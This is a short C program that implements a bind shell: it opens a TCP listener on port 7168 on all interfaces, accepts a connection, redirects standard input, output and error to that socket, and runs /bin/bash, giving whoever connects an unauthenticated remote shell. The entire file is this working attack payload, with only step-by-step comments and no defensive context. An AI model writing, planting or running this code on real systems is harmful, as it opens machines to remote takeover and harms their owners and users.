#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int sockfd;
int sockid;

struct sockaddr_in hostaddr;

int main() {
    // Create socket
    sockfd = socket(PF_INET, SOCK_STREAM, 0);

    // Setup struct for bind() argument
    hostaddr.sin_family = AF_INET;
    hostaddr.sin_port = htons(7168);
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);

    // Bind socket to ip 0.0.0.0, port 7168
    bind(sockfd, (struct sockaddr*) &hostaddr, sizeof(hostaddr));

    // Listen for incoming connections
    listen(sockfd, 2);

    // Accept incoming connection
    sockid = accept(sockfd, NULL, NULL);

    // Bind STDIN, STDOUT, STDERR to incoming connection
    dup2(sockid, 0);
    dup2(sockid, 1);
    dup2(sockid, 2);

    // Bind shell to incoming connection
    execve("/bin/bash", NULL, NULL);
}
